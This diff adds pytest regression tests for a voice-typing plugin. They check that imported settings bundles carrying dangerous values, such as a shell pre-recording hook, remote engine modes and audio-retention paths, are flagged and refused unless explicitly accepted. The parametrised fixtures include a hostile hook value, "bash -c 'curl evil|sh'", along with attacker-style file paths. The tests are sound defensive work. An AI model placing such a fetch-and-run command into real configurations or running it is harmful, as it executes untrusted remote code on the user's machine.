@@ -1431,6 +1431,139 @@ def test_redacted_import_paths_match_tui():
     assert bridge.REDACTED_IMPORT_PATHS == {".".join(p) for p in sync.SECRET_PATHS}
 
 
+def test_bridge_dangerous_paths_superset_of_tui():
+    """F2: the plugin owns its own dangerous set, upstream can only widen it.
+
+    voxtype_tui.sync.DANGEROUS_PATHS covers only the four SECRET_PATHS
+    plus whisper.remote_endpoint. Everything else an attacker-supplied
+    bundle can weaponise (the pre_recording hook, engine/mode switches,
+    the state file, file-output sink, meeting capture) must be flagged by
+    this plugin regardless of what upstream does.
+    """
+    from voxtype_tui import sync
+
+    upstream = {".".join(p) for p in sync.DANGEROUS_PATHS}
+    union = bridge._dangerous_setting_paths()
+    assert union >= upstream, upstream - union
+    assert union >= bridge.BRIDGE_DANGEROUS_PATHS
+    # The specific gaps this fix closes.
+    for path in (
+        "output.pre_recording_command", "engine", "whisper.mode", "state_file",
+        "output.file_path", "output.file_mode",
+        "meeting.retain_audio", "meeting.storage_path",
+        "soniox.api_key", "cohere.api_key",
+    ):
+        assert path in union, path
+        assert path not in upstream or path in bridge.BRIDGE_DANGEROUS_PATHS
+
+
+@pytest.mark.parametrize("planted,expected", [
+    ({"output": {"pre_recording_command": "bash -c 'curl evil|sh'"}},
+     ["output.pre_recording_command"]),
+    ({"engine": "moonshine"}, ["engine"]),
+    ({"whisper": {"mode": "remote"}}, ["whisper.mode"]),
+    ({"state_file": "/tmp/attacker-state"}, ["state_file"]),
+    ({"output": {"file_path": "/tmp/pwn.txt", "file_mode": "overwrite"}},
+     ["output.file_path", "output.file_mode"]),
+    ({"meeting": {"retain_audio": True, "storage_path": "/tmp/loot"}},
+     ["meeting.retain_audio", "meeting.storage_path"]),
+])
+def test_import_flags_bridge_dangerous_paths(env: Env, planted: dict, expected: list):
+    """F2 regression: these used to come back dangerous==[] and apply clean.
+
+    Before the fix, a bundle planting any of these applied SILENTLY: the
+    preview reported no dangerous rows, import.apply succeeded without
+    accept_dangerous, and the value landed in config.toml.
+    """
+    p = _bundle(env, settings=planted)
+    before = env.read_config()
+
+    pv = env.ok("import.preview", path=str(p), include_settings=True)
+    for path in expected:
+        assert path in pv["dangerous"], (path, pv["dangerous"])
+        row = next(c for c in pv["diff"]["settings_change"] if c["path"] == path)
+        assert row["dangerous"] is True
+        # C4: non-redacted rows keep old/new so the panel can render them.
+        if not row.get("redacted"):
+            assert "old" in row and "new" in row
+
+    # C3: refusal is live and writes NOTHING.
+    res = env.fail("import.apply", path=str(p), include_settings=True)
+    assert res["error"] == "dangerous-changes"
+    assert set(expected) <= set(res["dangerous"])
+    assert "diff" in res and "warnings" in res
+    assert env.read_config() == before
+    assert not env.sidecar.exists() or "pre_recording_command" not in env.sidecar.read_text()
+
+    # Only an explicit accept_dangerous lets it through.
+    ok = env.ok("import.apply", path=str(p), include_settings=True, accept_dangerous=True)
+    assert set(expected) <= {c["path"] for c in ok["applied"]["settings_change"]}
+
+
+def test_import_apply_refusal_shape(env: Env):
+    """C3: the refusal payload the QML lane renders."""
+    p = _bundle(env, settings={"output": {"pre_recording_command": "evil"}})
+    res = env.fail("import.apply", path=str(p), include_settings=True)
+    assert set(res) == {"ok", "error", "dangerous", "diff", "warnings"}
+    assert res["ok"] is False and res["error"] == "dangerous-changes"
+    assert res["dangerous"] == ["output.pre_recording_command"]
+    assert isinstance(res["diff"]["settings_change"], list)
+    assert isinstance(res["warnings"], list)
+    # accept_dangerous still defaults to False (C3): an explicit false
+    # and an absent flag behave identically.
+    assert env.fail("import.apply", path=str(p), include_settings=True,
+                    accept_dangerous=False)["error"] == "dangerous-changes"
+
+
+def test_every_settings_row_is_json_safe(env: Env):
+    """C4: the panel renders every row, so old/new must survive json.dumps."""
+    p = _bundle(env, settings={
+        "output": {"mode": "clipboard", "type_delay_ms": 7, "fallback_to_clipboard": False},
+        "whisper": {"language": "fr"},
+        "audio": {"feedback": {"volume": 0.25}},
+    })
+    res = env.ok("import.preview", path=str(p), include_settings=True)
+    rows = res["diff"]["settings_change"]
+    assert rows
+    for row in rows:
+        if row.get("redacted"):
+            assert set(row) == {"path", "dangerous", "redacted", "old_set", "new_set"}
+            assert "old" not in row and "new" not in row
+        else:
+            assert set(row) == {"path", "old", "new", "dangerous"}
+            json.dumps(row)  # raises on a tomlkit wrapper leaking through
+            for v in (row["old"], row["new"]):
+                assert v is None or isinstance(v, (str, int, float, bool, list, dict))
+
+
+def test_design_documents_secret_emission_accurately(env: Env):
+    """C5: DESIGN.md used to claim the bridge never emits the values of
+    all four REDACTED_IMPORT_PATHS. That was false — the user's own
+    post_process/pre/post-output commands ARE in the load snapshot. The
+    doc must describe what the code actually does.
+    """
+    design = (REPO / "docs" / "DESIGN.md").read_text()
+    assert bridge.SECRET_SETTINGS == {"whisper.remote_api_key"}
+
+    # The snapshot really does carry the shell-hook values ...
+    env.ok("settings.set", path="output.post_process.command", value="tr a-z A-Z")
+    snap = env.ok("load")["snapshot"]["settings"]
+    assert snap["output.post_process.command"] == "tr a-z A-Z"
+    # ... and really does not carry the API key.
+    env.set_api_key("sk-NEVER-EMITTED")
+    snap = env.ok("load")["snapshot"]["settings"]
+    assert "whisper.remote_api_key" not in snap
+    assert snap["whisper.remote_api_key_set"] is True
+    assert "sk-NEVER-EMITTED" not in json.dumps(env.ok("load"))
+    assert "sk-NEVER-EMITTED" not in json.dumps(env.ok("status"))
+
+    # So the doc must scope the never-emit claim to the API key and scope
+    # the redaction claim to import diff rows.
+    assert "Only `whisper.remote_api_key` is **never** emitted" in design
+    assert "in import diff rows specifically" in design
+    assert "bridge never emits their values in any response" not in design
+
+
 def test_import_preview_and_apply_never_leak_secret_values(env: Env):
     env.set_api_key("sk-SECRET123")
     env.ok("settings.set", path="output.post_process.command", value="old-hook --SECRETARG")
